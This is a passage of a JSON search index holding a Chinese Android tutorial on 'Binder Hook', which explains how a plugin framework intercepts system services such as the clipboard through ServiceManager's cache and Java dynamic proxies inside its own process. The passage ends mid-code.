\u63d2\u4ef6\u6846\u67b6\u4f5c\u4e3a\u5404\u4e2a\u63d2\u4ef6\u7684\u7ba1\u7406\u8005\uff0c\u4e3a\u4e86\u4f7f\u5f97\u63d2\u4ef6\u80fd\u591f \u65e0\u7f1d\u5730 \u4f7f\u7528\u8fd9\u4e9b\u7cfb\u7edf\u670d\u52a1\uff0c\u81ea\u7136\u4f1a\u5bf9\u8fd9\u4e9b\u7cfb\u7edf\u670d\u52a1\u505a\u51fa\u4e00\u5b9a\u7684\u6539\u9020(Hook)\uff0c\u4f7f\u5f97\u63d2\u4ef6\u7684\u5f00\u53d1\u548c\u4f7f\u7528\u66f4\u52a0\u65b9\u4fbf\uff0c\u4ece\u800c\u5927\u5927\u964d\u4f4e\u63d2\u4ef6\u7684\u5f00\u53d1\u548c\u7ef4\u62a4\u6210\u672c\u3002\u6bd4\u5982\uff0cHook\u4f4f ActivityManagerService \u53ef\u4ee5\u8ba9\u63d2\u4ef6\u65e0\u7f1d\u5730\u4f7f\u7528 startActivity \u65b9\u6cd5\u800c\u4e0d\u662f\u4f7f\u7528\u7279\u5b9a\u7684\u65b9\u5f0f(\u6bd4\u5982that\u8bed\u6cd5)\u6765\u542f\u52a8\u63d2\u4ef6\u6216\u8005\u4e3b\u7a0b\u5e8f\u7684\u4efb\u610f\u754c\u9762\u3002 \u6211\u4eec\u628a\u8fd9\u79cdHook\u7cfb\u7edf\u670d\u52a1\u7684\u673a\u5236\u79f0\u4e4b\u4e3aBinder Hook\uff0c\u56e0\u4e3a\u672c\u8d28\u4e0a\u8fd9\u4e9b\u670d\u52a1\u63d0\u4f9b\u8005\u90fd\u662f\u5b58\u5728\u4e8e\u7cfb\u7edf\u5404\u4e2a\u8fdb\u7a0b\u7684Binder\u5bf9\u8c61\u3002\u56e0\u6b64\uff0c\u8981\u7406\u89e3\u63a5\u4e0b\u6765\u7684\u5185\u5bb9\u5fc5\u987b\u4e86\u89e3Android\u7684Binder\u673a\u5236\uff0c\u53ef\u4ee5\u53c2\u8003\u6211\u4e4b\u524d\u7684\u6587\u7ae0 Binder\u5b66\u4e60\u6307\u5357 \u9605\u8bfb\u672c\u6587\u4e4b\u524d\uff0c\u53ef\u4ee5\u5148clone\u4e00\u4efd understand-plugin-framework \uff0c\u53c2\u8003\u6b64\u9879\u76ee\u7684 binder-hook \u6a21\u5757\u3002\u53e6\u5916\uff0c\u63d2\u4ef6\u6846\u67b6\u539f\u7406\u89e3\u6790\u7cfb\u5217\u6587\u7ae0\u89c1 \u7d22\u5f15 \u3002","title":"Android\u63d2\u4ef6\u5316\u539f\u7406\u89e3\u6790\u2014\u2014Hook\u673a\u5236\u4e4bBinder Hook"},{"location":"Android/Android%E6%8F%92%E4%BB%B6%E5%8C%96%E5%8E%9F%E7%90%86%E8%A7%A3%E6%9E%90%E2%80%94%E2%80%94Hook%E6%9C%BA%E5%88%B6%E4%B9%8BBinder%20Hook/#_1","text":"\u6211\u4eec\u77e5\u9053\u7cfb\u7edf\u7684\u5404\u4e2a\u8fdc\u7a0bservice\u5bf9\u8c61\u90fd\u662f\u4ee5Binder\u7684\u5f62\u5f0f\u5b58\u5728\u7684\uff0c\u800c\u8fd9\u4e9bBinder\u6709\u4e00\u4e2a\u7ba1\u7406\u8005\uff0c\u90a3\u5c31\u662f ServiceManager \uff1b\u6211\u4eec\u8981Hook\u6389\u8fd9\u4e9bservice\uff0c\u81ea\u7136\u8981\u4ece\u8fd9\u4e2a ServiceManager \u4e0b\u624b\uff0c\u4e0d\u7136\u661f\u7f57\u68cb\u5e03\u7684Binder\u5e7f\u6cdb\u5b58\u5728\u4e8e\u7cfb\u7edf\u7684\u5404\u4e2a\u89d2\u843d\uff0c\u8981\u4e00\u4e2a\u4e2a\u627e\u51fa\u6765\u8fd8\u771f\u662f\u5927\u6d77\u635e\u9488\u3002 \u56de\u60f3\u4e00\u4e0b\u6211\u4eec\u4f7f\u7528\u7cfb\u7edf\u670d\u52a1\u7684\u65f6\u5019\u662f\u600e\u4e48\u5e72\u7684\uff0c\u60f3\u5fc5\u8fd9\u4e2a\u5927\u5bb6\u4e00\u5b9a\u518d\u719f\u6089\u4e0d\u8fc7\u4e86\uff1a\u901a\u8fc7 Context \u5bf9\u8c61\u7684 getSystemService \u65b9\u6cd5\uff1b\u6bd4\u5982\u8981\u4f7f\u7528 ActivityManager \uff1a ActivityManager am = (ActivityManager) context.getSystemService(Context.ACTIVITY_SERVICE); \u53ef\u662f\u8fd9\u4e2a\u8c8c\u4f3c\u8ddf ServiceManager \u6ca1\u6709\u4ec0\u4e48\u5173\u7cfb\u554a\uff1f\u6211\u4eec\u518d\u67e5\u770b getSystemService \u65b9\u6cd5\uff1b(Context\u7684\u5b9e\u73b0\u5728 ContextImpl \u91cc\u9762)\uff1a public Object getSystemService(String name) { ServiceFetcher fetcher = SYSTEM_SERVICE_MAP.get(name); return fetcher == null ? null : fetcher.getService(this);} \u5f88\u7b80\u5355\uff0c\u6240\u6709\u7684service\u5bf9\u8c61\u90fd\u4fdd\u5b58\u5728\u4e00\u5f20 map \u91cc\u9762\uff0c\u6211\u4eec\u518d\u770b\u8fd9\u4e2amap\u662f\u600e\u4e48\u521d\u59cb\u5316\u7684\uff1a registerService(ACCOUNT_SERVICE, new ServiceFetcher() { public Object createService(ContextImpl ctx) { IBinder b = ServiceManager.getService(ACCOUNT_SERVICE); IAccountManager service = IAccountManager.Stub.asInterface(b); return new AccountManager(ctx, service); }}); \u5728 ContextImpl \u7684\u9759\u6001\u521d\u59cb\u5316\u5757\u91cc\u9762\uff0c\u6709\u7684Service\u662f\u50cf\u4e0a\u9762\u8fd9\u6837\u521d\u59cb\u5316\u7684\uff1b\u53ef\u4ee5\u770b\u5230\uff0c\u786e\u5b9e\u4f7f\u7528\u4e86 ServiceManager \uff1b\u5f53\u7136\u8fd8\u6709\u4e00\u4e9bservice\u5e76\u6ca1\u6709\u76f4\u63a5\u4f7f\u7528 ServiceManager \uff0c\u800c\u662f\u505a\u4e86\u4e00\u5c42\u5305\u88c5\u5e76\u8fd4\u56de\u4e86\u8fd9\u4e2a\u5305\u88c5\u5bf9\u8c61\uff0c\u6bd4\u5982\u6211\u4eec\u7684 ActivityManager \uff0c\u5b83\u8fd4\u56de\u7684\u662f ActivityManager \u8fd9\u4e2a\u5305\u88c5\u5bf9\u8c61\uff1a registerService(ACTIVITY_SERVICE, new ServiceFetcher() { public Object createService(ContextImpl ctx) { return new ActivityManager(ctx.getOuterContext(), ctx.mMainThread.getHandler()); }}); \u4f46\u662f\u5728 ActivityManager \u8fd9\u4e2a\u7c7b\u5185\u90e8\uff0c\u4e5f\u4f7f\u7528\u4e86 ServiceManager \uff1b\u5177\u4f53\u6765\u8bf4\uff0c\u56e0\u4e3aActivityManager\u91cc\u9762\u6240\u6709\u7684\u6838\u5fc3\u64cd\u4f5c\u90fd\u662f\u4f7f\u7528 ActivityManagerNative.getDefault() \u5b8c\u6210\u7684\u3002\u90a3\u4e48\u8fd9\u4e2a\u8bed\u53e5\u5e72\u4e86\u4ec0\u4e48\u5462\uff1f private static final Singleton<IActivityManager> gDefault = new Singleton<IActivityManager>() { protected IActivityManager create() { IBinder b = ServiceManager.getService(\"activity\"); IActivityManager am = asInterface(b); return am; } }; \u56e0\u6b64\uff0c\u901a\u8fc7\u5206\u6790\u6211\u4eec\u5f97\u77e5\uff0c\u7cfb\u7edfService\u7684\u4f7f\u7528\u5176\u5b9e\u5c31\u5206\u4e3a\u4e24\u6b65\uff1a IBinder b = ServiceManager.getService(\"service_name\"); // \u83b7\u53d6\u539f\u59cb\u7684IBinder\u5bf9\u8c61IXXInterface in = IXXInterface.Stub.asInterface(b); // \u8f6c\u6362\u4e3aService\u63a5\u53e3","title":"\u7cfb\u7edf\u670d\u52a1\u7684\u83b7\u53d6\u8fc7\u7a0b"},{"location":"Android/Android%E6%8F%92%E4%BB%B6%E5%8C%96%E5%8E%9F%E7%90%86%E8%A7%A3%E6%9E%90%E2%80%94%E2%80%94Hook%E6%9C%BA%E5%88%B6%E4%B9%8BBinder%20Hook/#hook","text":"\u5728 \u63d2\u4ef6\u6846\u67b6\u539f\u7406\u89e3\u6790\u2014\u2014Hook\u673a\u5236\u4e4b\u52a8\u6001\u4ee3\u7406 \u91cc\u9762\u6211\u4eec\u8bf4\u8fc7\uff0cHook\u5206\u4e3a\u4e09\u6b65\uff0c\u6700\u5173\u952e\u7684\u4e00\u6b65\u5c31\u662f\u5bfb\u627eHook\u70b9\u3002\u6211\u4eec\u73b0\u5728\u5df2\u7ecf\u641e\u6e05\u695a\u4e86\u7cfb\u7edf\u670d\u52a1\u7684\u4f7f\u7528\u8fc7\u7a0b\uff0c\u90a3\u4e48\u5c31\u9700\u8981\u627e\u51fa\u5728\u8fd9\u4e2a\u8fc7\u7a0b\u4e2d\uff0c\u5728\u54ea\u4e2a\u73af\u8282\u662f\u6700\u5408\u9002hook\u7684\u3002 \u7531\u4e8e\u7cfb\u7edf\u670d\u52a1\u7684\u4f7f\u7528\u8005\u90fd\u662f\u5bf9\u7b2c\u4e8c\u6b65\u83b7\u53d6\u5230\u7684 IXXInterface \u8fdb\u884c\u64cd\u4f5c\uff0c\u56e0\u6b64\u5982\u679c\u6211\u4eec\u8981hook\u6389\u67d0\u4e2a\u7cfb\u7edf\u670d\u52a1\uff0c \u53ea\u9700\u8981\u628a\u7b2c\u4e8c\u6b65\u7684 asInterface \u65b9\u6cd5\u8fd4\u56de\u7684\u5bf9\u8c61\u4fee\u6539\u4e3a\u4e3a\u6211\u4eecHook\u8fc7\u7684\u5bf9\u8c61\u5c31\u53ef\u4ee5\u4e86\u3002","title":"\u5bfb\u627eHook\u70b9"},{"location":"Android/Android%E6%8F%92%E4%BB%B6%E5%8C%96%E5%8E%9F%E7%90%86%E8%A7%A3%E6%9E%90%E2%80%94%E2%80%94Hook%E6%9C%BA%E5%88%B6%E4%B9%8BBinder%20Hook/#asinterface","text":"\u63a5\u4e0b\u6765\u6211\u4eec\u5206\u6790 asInterface \u65b9\u6cd5\uff0c\u7136\u540e\u60f3\u529e\u6cd5\u628a\u8fd9\u4e2a\u65b9\u6cd5\u7684\u8fd4\u56de\u503c\u4fee\u6539\u4e3a\u6211\u4eecHook\u8fc7\u7684\u7cfb\u7edf\u670d\u52a1\u5bf9\u8c61\u3002\u8fd9\u91cc\u6211\u4eec\u4ee5\u7cfb\u7edf\u526a\u5207\u7248\u670d\u52a1\u4e3a\u4f8b\uff0c\u6e90\u7801\u4f4d\u7f6e\u4e3a android.content.IClipboard , IClipboard.Stub.asInterface \u65b9\u6cd5\u4ee3\u7801\u5982\u4e0b\uff1a public static android.content.IClipboard asInterface(android.os.IBinder obj) { if ((obj == null)) { return null; } android.os.IInterface iin = obj.queryLocalInterface(DESCRIPTOR); // Hook\u70b9 if (((iin != null) && (iin instanceof android.content.IClipboard))) { return ((android.content.IClipboard) iin); } return new android.content.IClipboard.Stub.Proxy(obj);} \u8fd9\u4e2a\u65b9\u6cd5\u7684\u610f\u601d\u5c31\u662f\uff1a\u5148\u67e5\u770b\u672c\u8fdb\u7a0b\u662f\u5426\u5b58\u5728\u8fd9\u4e2aBinder\u5bf9\u8c61\uff0c\u5982\u679c\u6709\u90a3\u4e48\u76f4\u63a5\u5c31\u662f\u672c\u8fdb\u7a0b\u8c03\u7528\u4e86\uff1b\u5982\u679c\u4e0d\u5b58\u5728\u90a3\u4e48\u521b\u5efa\u4e00\u4e2a\u4ee3\u7406\u5bf9\u8c61\uff0c\u8ba9\u4ee3\u7406\u5bf9\u8c61\u59d4\u6258\u9a71\u52a8\u5b8c\u6210\u8de8\u8fdb\u7a0b\u8c03\u7528\u3002 \u89c2\u5bdf\u8fd9\u4e2a\u65b9\u6cd5\uff0c\u524d\u9762\u7684\u90a3\u4e2aif\u8bed\u53e5\u5224\u7a7a\u8fd4\u56de\u80af\u5b9a\u52a8\u4e0d\u4e86\u624b\u811a\uff1b\u6700\u540e\u4e00\u53e5\u8c03\u7528\u6784\u9020\u51fd\u6570\u7136\u540e\u76f4\u63a5\u8fd4\u56de\u6211\u4eec\u4e5f\u662f\u65e0\u4ece\u4e0b\u624b\uff0c\u8981\u4fee\u6539 asInterface \u65b9\u6cd5\u7684\u8fd4\u56de\u503c\uff0c\u6211\u4eec\u552f\u4e00\u80fd\u505a\u7684\u5c31\u662f\u4ece\u8fd9\u4e00\u53e5\u4e0b\u624b\uff1a android.os.IInterface iin = obj.queryLocalInterface(DESCRIPTOR); // Hook\u70b9 \u6211\u4eec\u53ef\u4ee5\u5c1d\u8bd5\u4fee\u6539\u8fd9\u4e2a obj \u5bf9\u8c61\u7684 queryLocalInterface \u65b9\u6cd5\u7684\u8fd4\u56de\u503c\uff0c\u5e76\u4fdd\u8bc1\u8fd9\u4e2a\u8fd4\u56de\u503c\u7b26\u5408\u63a5\u4e0b\u6765\u7684 if \u6761\u4ef6\u68c0\u6d4b\uff0c\u90a3\u4e48\u5c31\u8fbe\u5230\u4e86\u4fee\u6539 asInterface \u65b9\u6cd5\u8fd4\u56de\u503c\u7684\u76ee\u7684\u3002 \u800c\u8fd9\u4e2a obj \u5bf9\u8c61\u521a\u597d\u662f\u6211\u4eec\u7b2c\u4e00\u6b65\u8fd4\u56de\u7684 IBinder \u5bf9\u8c61\uff0c\u63a5\u4e0b\u6765\u6211\u4eec\u5c1d\u8bd5\u5bf9\u8fd9\u4e2a IBinder \u5bf9\u8c61\u7684 queryLocalInterface \u65b9\u6cd5\u8fdb\u884chook\u3002","title":"asInterface\u8fc7\u7a0b"},{"location":"Android/Android%E6%8F%92%E4%BB%B6%E5%8C%96%E5%8E%9F%E7%90%86%E8%A7%A3%E6%9E%90%E2%80%94%E2%80%94Hook%E6%9C%BA%E5%88%B6%E4%B9%8BBinder%20Hook/#getservice","text":"\u4e0a\u6587\u5206\u6790\u5f97\u77e5\uff0c\u6211\u4eec\u60f3\u8981\u4fee\u6539 IBinder \u5bf9\u8c61\u7684 queryLocalInterface \u65b9\u6cd5\uff1b\u83b7\u53d6 IBinder \u5bf9\u8c61\u7684\u8fc7\u7a0b\u5982\u4e0b\uff1a IBinder b = ServiceManager.getService(\"service_name\"); \u56e0\u6b64\uff0c\u6211\u4eec\u5e0c\u671b\u80fd\u4fee\u6539\u8fd9\u4e2a getService \u65b9\u6cd5\u7684\u8fd4\u56de\u503c\uff0c\u8ba9\u8fd9\u4e2a\u65b9\u6cd5\u8fd4\u56de\u4e00\u4e2a\u6211\u4eec\u4f2a\u9020\u8fc7\u7684 IBinder \u5bf9\u8c61\uff1b\u8fd9\u6837\uff0c\u6211\u4eec\u53ef\u4ee5\u5728\u81ea\u5df1\u4f2a\u9020\u7684 IBinder \u5bf9\u8c61\u7684 queryLocalInterface \u65b9\u6cd5\u4f5c\u5904\u7406\uff0c\u8fdb\u800c\u4f7f\u5f97 asInterface \u65b9\u6cd5\u8fd4\u56de\u5728 queryLocalInterface \u65b9\u6cd5\u91cc\u9762\u5904\u7406\u8fc7\u7684\u503c\uff0c\u6700\u7ec8\u5b9e\u73b0hook\u7cfb\u7edf\u670d\u52a1\u7684\u76ee\u7684\u3002 \u5728\u8ddf\u8e2a\u8fd9\u4e2a getService \u65b9\u6cd5\u4e4b\u524d\u6211\u4eec\u601d\u8003\u4e00\u4e0b\uff0c\u7531\u4e8e\u7cfb\u7edf\u670d\u52a1\u662f\u4e00\u7cfb\u5217\u7684\u8fdc\u7a0bService\uff0c\u5b83\u4eec\u7684\u672c\u4f53\uff0c\u4e5f\u5c31\u662fBinder\u672c\u5730\u5bf9\u8c61\u4e00\u822c\u90fd\u5b58\u5728\u4e8e\u67d0\u4e2a\u5355\u72ec\u7684\u8fdb\u7a0b\uff0c\u5728\u8fd9\u4e2a\u8fdb\u7a0b\u4e4b\u5916\u7684\u5176\u4ed6\u8fdb\u7a0b\u5b58\u5728\u7684\u90fd\u662f\u8fd9\u4e9bBinder\u672c\u5730\u5bf9\u8c61\u7684\u4ee3\u7406\u3002\u56e0\u6b64\u5728\u6211\u4eec\u7684\u8fdb\u7a0b\u91cc\u9762\uff0c\u5b58\u5728\u7684\u4e5f\u53ea\u662f\u8fd9\u4e2aBinder\u4ee3\u7406\u5bf9\u8c61\uff0c\u6211\u4eec\u4e5f\u53ea\u80fd\u5bf9\u8fd9\u4e9bBinder\u4ee3\u7406\u5bf9\u8c61\u4e0b\u624b\u3002(\u5982\u679c\u8fd9\u4e00\u6bb5\u770b\u4e0d\u61c2\uff0c\u5efa\u8bae\u4e0d\u8981\u5f80\u4e0b\u770b\u4e86\uff0c\u5148\u770b Binder\u5b66\u4e60\u6307\u5357 ) \u7136\u540e\uff0c\u8fd9\u4e2a getService \u662f\u4e00\u4e2a\u9759\u6001\u65b9\u6cd5\uff0c\u5982\u679c\u6b64\u65b9\u6cd5\u4ec0\u4e48\u90fd\u4e0d\u505a\uff0c\u62ff\u5230Binder\u4ee3\u7406\u5bf9\u8c61\u4e4b\u540e\u76f4\u63a5\u8fd4\u56de\uff1b\u90a3\u4e48\u6211\u4eec\u5c31\u65e0\u80fd\u4e3a\u529b\u4e86\uff1a\u6211\u4eec\u6ca1\u6709\u529e\u6cd5\u62e6\u622a\u4e00\u4e2a\u9759\u6001\u65b9\u6cd5\uff0c\u4e5f\u6ca1\u6709\u529e\u6cd5\u83b7\u53d6\u5230\u8fd9\u4e2a\u9759\u6001\u65b9\u6cd5\u91cc\u9762\u7684\u5c40\u90e8\u53d8\u91cf(\u5373\u6211\u4eec\u5e0c\u671b\u4fee\u6539\u7684\u90a3\u4e2aBinder\u4ee3\u7406\u5bf9\u8c61)\u3002 \u63a5\u4e0b\u6765\u5c31\u53ef\u4ee5\u770b\u8fd9\u4e2a getService \u7684\u4ee3\u7801\u4e86\uff1a public static IBinder getService(String name) { try { IBinder service = sCache.get(name); if (service != null) { return service; } else { return getIServiceManager().getService(name); } } catch (RemoteException e) { Log.e(TAG, \"error in getService\", e); } return null;} \u5929\u65e0\u7edd\u4eba\u4e4b\u8def\uff01 ServiceManager \u4e3a\u4e86\u907f\u514d\u6bcf\u6b21\u90fd\u8fdb\u884c\u8de8\u8fdb\u7a0b\u901a\u4fe1\uff0c\u628a\u8fd9\u4e9bBinder\u4ee3\u7406\u5bf9\u8c61\u7f13\u5b58\u5728\u4e00\u5f20 map \u91cc\u9762\u3002 \u6211\u4eec\u53ef\u4ee5\u66ff\u6362\u8fd9\u4e2amap\u91cc\u9762\u7684\u5185\u5bb9\u4e3aHook\u8fc7\u7684 IBinder \u5bf9\u8c61\uff0c\u7531\u4e8e\u7cfb\u7edf\u5728 getService \u7684\u65f6\u5019\u6bcf\u6b21\u90fd\u4f1a\u4f18\u5148\u67e5\u627e\u7f13\u5b58\uff0c\u56e0\u6b64\u8fd4\u56de\u7ed9\u4f7f\u7528\u8005\u7684\u90fd\u662f\u88ab\u6211\u4eec\u4fee\u6539\u8fc7\u7684\u5bf9\u8c61\uff0c\u4ece\u800c\u8fbe\u5230\u7792\u5929\u8fc7\u6d77\u7684\u76ee\u7684\u3002 \u603b\u7ed3\u4e00\u4e0b\uff0c\u8981\u8fbe\u5230\u4fee\u6539\u7cfb\u7edf\u670d\u52a1\u7684\u76ee\u7684\uff0c\u6211\u4eec\u9700\u8981\u5982\u4e0b\u4e24\u6b65\uff1a \u9996\u5148\u80af\u5b9a\u9700\u8981 \u4f2a\u9020\u4e00\u4e2a\u7cfb\u7edf\u670d\u52a1\u5bf9\u8c61 \uff0c\u63a5\u4e0b\u6765\u5c31\u8981\u60f3\u529e\u6cd5\u8ba9 asInterface \u80fd\u591f\u8fd4\u56de\u6211\u4eec\u7684\u8fd9\u4e2a\u4f2a\u9020\u5bf9\u8c61\u800c\u4e0d\u662f\u539f\u59cb\u7684\u7cfb\u7edf\u670d\u52a1\u5bf9\u8c61\u3002 \u901a\u8fc7\u4e0a\u6587\u5206\u6790\u6211\u4eec\u77e5\u9053\uff0c\u53ea\u8981\u8ba9 getService \u8fd4\u56de IBinder \u5bf9\u8c61\u7684 queryLocalInterface \u65b9\u6cd5\u76f4\u63a5\u8fd4\u56de\u6211\u4eec\u4f2a\u9020\u8fc7\u7684\u7cfb\u7edf\u670d\u52a1\u5bf9\u8c61\u5c31\u80fd\u8fbe\u5230\u76ee\u7684\u3002\u6240\u4ee5\uff0c\u6211\u4eec\u9700\u8981 \u4f2a\u9020\u4e00\u4e2aIBinder\u5bf9\u8c61 \uff0c\u4e3b\u8981\u662f\u4fee\u6539\u5b83\u7684 queryLocalInterface \u65b9\u6cd5\uff0c\u8ba9\u5b83\u8fd4\u56de\u6211\u4eec\u4f2a\u9020\u7684\u7cfb\u7edf\u670d\u52a1\u5bf9\u8c61\uff1b\u7136\u540e\u628a\u8fd9\u4e2a\u4f2a\u9020\u5bf9\u8c61\u653e\u7f6e\u5728 ServiceManager \u7684\u7f13\u5b58 map \u91cc\u9762\u5373\u53ef\u3002 \u6211\u4eec\u901a\u8fc7Binder\u673a\u5236\u7684 \u4f18\u5148\u67e5\u627e\u672c\u5730Binder\u5bf9\u8c61 \u7684\u8fd9\u4e2a\u7279\u6027\u8fbe\u5230\u4e86Hook\u6389\u7cfb\u7edf\u670d\u52a1\u5bf9\u8c61\u7684\u76ee\u7684\u3002\u56e0\u6b64 queryLocalInterface \u4e5f\u5931\u53bb\u4e86\u5b83\u539f\u672c\u7684\u610f\u4e49(\u53ea\u67e5\u627e\u672c\u5730Binder\u5bf9\u8c61\uff0c\u6ca1\u6709\u672c\u5730\u5bf9\u8c61\u8fd4\u56denull)\uff0c\u8fd9\u4e2a\u65b9\u6cd5\u53ea\u662f\u4e00\u4e2a\u5080\u5121\uff0c\u662f\u6211\u4eec\u5b9e\u73b0hook\u7cfb\u7edf\u5bf9\u8c61\u7684\u6865\u6881\uff1a\u6211\u4eec\u901a\u8fc7\u8fd9\u4e2a\u201c\u6f0f\u6d1e\u201d\u8ba9 asInterface \u6c38\u8fdc\u90fd\u8fd4\u56de\u6211\u4eec\u4f2a\u9020\u8fc7\u7684\u5bf9\u8c61\u3002\u7531\u4e8e\u6211\u4eec\u63a5\u7ba1\u4e86 asInterface \u8fd9\u4e2a\u65b9\u6cd5\u7684\u5168\u90e8\uff0c\u6211\u4eec\u4f2a\u9020\u8fc7\u7684\u8fd9\u4e2a\u7cfb\u7edf\u670d\u52a1\u5bf9\u8c61\u4e0d\u80fd\u662f\u53ea\u62e5\u6709\u672c\u5730Binder\u5bf9\u8c61(\u539f\u59cb queryLocalInterface \u65b9\u6cd5\u8fd4\u56de\u7684\u5bf9\u8c61)\u7684\u80fd\u529b\uff0c\u8fd8\u8981\u6709Binder\u4ee3\u7406\u5bf9\u8c61\u64cd\u7eb5\u9a71\u52a8\u7684\u80fd\u529b\u3002 \u63a5\u4e0b\u6765\u6211\u4eec\u5c31\u4ee5Hook\u7cfb\u7edf\u7684\u526a\u5207\u7248\u670d\u52a1\u4e3a\u4f8b\uff0c\u7528\u5b9e\u9645\u4ee3\u7801\u6765\u8bf4\u660e\uff0c\u5982\u4f55Hook\u6389\u7cfb\u7edf\u670d\u52a1\u3002","title":"getService\u8fc7\u7a0b"},{"location":"Android/Android%E6%8F%92%E4%BB%B6%E5%8C%96%E5%8E%9F%E7%90%86%E8%A7%A3%E6%9E%90%E2%80%94%E2%80%94Hook%E6%9C%BA%E5%88%B6%E4%B9%8BBinder%20Hook/#hook_1","text":"","title":"Hook\u7cfb\u7edf\u526a\u5207\u7248\u670d\u52a1"},{"location":"Android/Android%E6%8F%92%E4%BB%B6%E5%8C%96%E5%8E%9F%E7%90%86%E8%A7%A3%E6%9E%90%E2%80%94%E2%80%94Hook%E6%9C%BA%E5%88%B6%E4%B9%8BBinder%20Hook/#_2","text":"\u9996\u5148\u6211\u4eec\u7528\u4ee3\u7406\u7684\u65b9\u5f0f\u4f2a\u9020\u4e00\u4e2a\u526a\u5207\u7248\u670d\u52a1\u5bf9\u8c61\uff0c\u5173\u4e8e\u5982\u4f55\u4f7f\u7528\u4ee3\u7406\u7684\u65b9\u5f0f\u8fdb\u884chook\u4ee5\u53ca\u5176\u4e2d\u7684\u539f\u7406\uff0c\u53ef\u4ee5\u67e5\u770b \u63d2\u4ef6\u6846\u67b6\u539f\u7406\u89e3\u6790\u2014\u2014Hook\u673a\u5236\u4e4b\u52a8\u6001\u4ee3\u7406 \u3002 \u5177\u4f53\u4ee3\u7801\u5982\u4e0b\uff0c\u6211\u4eec\u7528\u52a8\u6001\u4ee3\u7406\u7684\u65b9\u5f0fHook\u6389\u4e86 hasPrimaryClip() \uff0c getPrimaryClip() \u8fd9\u4e24\u4e2a\u65b9\u6cd5\uff1a public class BinderHookHandler implements InvocationHandler { private static final String TAG = \"BinderHookHandler\"; // \u539f\u59cb\u7684Service\u5bf9\u8c61 (IInterface) Object base; public BinderHookHandler(IBinder base, Class<?> stubClass) { try { Method asInterfaceMethod = stubClass.getDeclaredMethod(\"asInterface\", IBinder.class); // IClipboard.Stub.asInterface(base); this.base = asInterfaceMethod.invoke(null, base); } catch (Exception e) { throw new RuntimeException(\"hooked failed!\"); } } @TargetApi(Build.VERSION_CODES.HONEYCOMB) @Override public Object invoke(Object proxy, Method method, Object[] args) throws Throwable { // \u628a\u526a\u5207\u7248\u7684\u5185\u5bb9\u66ff\u6362\u4e3a \"you are hooked\" if (\"getPrimaryClip\".equals(method.getName())) { Log.d(TAG, \"hook getPrimaryClip\"); return ClipData.newPlainText(null, \"you are hooked\"); } // \u6b3a\u9a97\u7cfb\u7edf,\u4f7f\u4e4b\u8ba4\u4e3a\u526a\u5207\u7248\u4e0a\u4e00\u76f4\u6709\u5185\u5bb9 if (\"hasPrimaryClip\".equals(method.getName())) { return true; } return method.invoke(base, args); }} \u6ce8\u610f\uff0c\u6211\u4eec\u62ff\u5230\u539f\u59cb\u7684 IBinder \u5bf9\u8c61\u4e4b\u540e\uff0c\u5982\u679c\u6211\u4eec\u5e0c\u671b\u4f7f\u7528\u88abHook\u4e4b\u524d\u7684\u7cfb\u7edf\u670d\u52a1\uff0c\u5e76\u4e0d\u80fd\u76f4\u63a5\u4f7f\u7528\u8fd9\u4e2a IBinder \u5bf9\u8c61\uff0c\u800c\u662f\u9700\u8981\u4f7f\u7528 asInterface \u65b9\u6cd5\u5c06\u5b83\u8f6c\u6362\u4e3a IClipboard \u63a5\u53e3\uff1b\u56e0\u4e3a getService \u65b9\u6cd5\u8fd4\u56de\u7684 IBinder \u5b9e\u9645\u4e0a\u662f\u4e00\u4e2a \u88f8Binder\u4ee3\u7406\u5bf9\u8c61 \uff0c\u5b83\u53ea\u6709\u4e0e\u9a71\u52a8\u6253\u4ea4\u9053\u7684\u80fd\u529b\uff0c\u4f46\u662f\u5b83\u5e76\u4e0d\u80fd\u72ec\u7acb\u5de5\u4f5c\uff0c\u9700\u8981\u4eba\u6307\u6325\u5b83\uff1b asInterface \u65b9\u6cd5\u8fd4\u56de\u7684 IClipboard.Stub.Proxy \u7c7b\u7684\u5bf9\u8c61\u901a\u8fc7\u64cd\u7eb5\u8fd9\u4e2a\u88f8 BinderProxy \u5bf9\u8c61\u4ece\u800c\u5b9e\u73b0\u4e86\u5177\u4f53\u7684 IClipboard \u63a5\u53e3\u5b9a\u4e49\u7684\u64cd\u4f5c\u3002","title":"\u4f2a\u9020\u526a\u5207\u7248\u670d\u52a1\u5bf9\u8c61"},{"location":"Android/Android%E6%8F%92%E4%BB%B6%E5%8C%96%E5%8E%9F%E7%90%86%E8%A7%A3%E6%9E%90%E2%80%94%E2%80%94Hook%E6%9C%BA%E5%88%B6%E4%B9%8BBinder%20Hook/#ibinder","text":"\u5728\u4e0a\u4e00\u6b65\u4e2d\uff0c\u6211\u4eec\u5df2\u7ecf\u4f2a\u9020\u597d\u4e86\u7cfb\u7edf\u670d\u52a1\u5bf9\u8c61\uff0c\u73b0\u5728\u8981\u505a\u7684\u5c31\u662f\u60f3\u529e\u6cd5\u8ba9 asInterface \u65b9\u6cd5\u8fd4\u56de\u6211\u4eec\u4f2a\u9020\u7684\u5bf9\u8c61\u4e86\uff1b\u6211\u4eec\u4f2a\u9020\u4e00\u4e2a IBinder \u5bf9\u8c61\uff1a public class BinderProxyHookHandler implements InvocationHandler { private static final String TAG = \"BinderProxyHookHandler\"; // \u7edd\u5927\u90e8\u5206\u60c5\u51b5\u4e0b,\u8fd9\u662f\u4e00\u4e2aBinderProxy\u5bf9\u8c61 // \u53ea\u6709\u5f53Service\u548c\u6211\u4eec\u5728\u540c\u4e00\u4e2a\u8fdb\u7a0b\u7684\u65f6\u5019\u624d\u662fBinder\u672c\u5730\u5bf9\u8c61 // \u8fd9\u4e2a\u57fa\u672c\u4e0d\u53ef\u80fd IBinder base; Class<?> stub; Class<?> iinterface; public BinderProxyHookHandler(IBinder base) { this.base = base; try { this.stub = Class.forName(\"android.content.IClipboard$Stub\"); this.iinterface = Class.forName(\"android.content.IClipboard\"); } catch (ClassNotFoundException e) { e.printStackTrace(); } } @Override public Object invoke(Object proxy, Method method, Object[] args) throws Throwable { if (\"queryLocalInterface\".equals(method.getName())) { Log.d(TAG, \"hook queryLocalInterface\"); // \u8fd9\u91cc\u76f4\u63a5\u8fd4\u56de\u771f\u6b63\u88abHook\u6389\u7684Service\u63a5\u53e3 // \u8fd9\u91cc\u7684 queryLocalInterface \u5c31\u4e0d\u662f\u539f\u672c\u7684\u610f\u601d\u4e86 // \u6211\u4eec\u80af\u5b9a\u4e0d\u4f1a\u771f\u7684\u8fd4\u56de\u4e00\u4e2a\u672c\u5730\u63a5\u53e3, \u56e0\u4e3a\u6211\u4eec\u63a5\u7ba1\u4e86 asInterface\u65b9\u6cd5\u7684\u4f5c\u7528 // 